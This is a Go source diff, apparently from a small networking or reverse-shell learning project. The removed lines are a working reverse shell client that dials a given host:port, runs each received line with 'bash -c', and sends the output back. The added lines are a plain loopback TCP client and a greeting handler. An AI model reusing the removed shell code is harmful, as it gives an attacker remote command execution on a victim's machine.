@@ -6,44 +6,18 @@ import (
 	"log"
 	"net"
 	"os"
-	"os/exec"
+	"time"
 )
 
 func main() {
-	arguments := os.Args
-	if len(arguments) == 1 {
-		fmt.Println("Please provide host:port.")
-		return
-	}
-
-	CONNECT := arguments[1]
-	c, err := net.Dial("tcp", CONNECT)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-
+	c, _ := net.Dial("tcp", "127.0.0.1:4444") //net.Dial is used to connect to the remote server
+	//listener
 	for {
-		/*
-			reader := bufio.NewReader(os.Stdin)
-			fmt.Print(">> ")
-			text, _ := reader.ReadString('\n')
-			fmt.Fprintf(c, text+"\n") */
-
-		message, _ := bufio.NewReader(c).ReadString('\n')
-		cmd := exec.Command("bash", "-c", message)
-		if err != nil {
-			log.Fatalln(err)
-		}
-		out, _ := cmd.CombinedOutput()
-
-		c.Write(out)
-		/*
-			fmt.Print("->: " + message)
-			if strings.TrimSpace(string(text)) == "STOP" {
-				fmt.Println("TCP client exiting...")
-				return
-			} */
+		/* Get user input verified by os.Stdin */
+		reader := bufio.NewReader(os.Stdin)
+		fmt.Print(">> ")
+		text, _ := reader.ReadString('\n')
+		fmt.Fprintf(c, text+"\n")
 	}
 
 	//COMMANDS TO GIVE REMOST HOST A SHELL
@@ -60,6 +34,18 @@ func main() {
 		} */
 }
 
-func getUID() {
+func handleIncomingConnection(conn net.Conn) {
+	// store incoming data
+	buffer := make([]byte, 1024)
+	_, err := conn.Read(buffer)
+	if err != nil {
+		log.Fatal(err)
+	}
+	// respond
+	time := time.Now().Format("Monday, 02-Jan-06 15:04:05 MST")
+	conn.Write([]byte("Hi back!\n"))
+	conn.Write([]byte(time))
 
+	// close conn
+	conn.Close()
 }
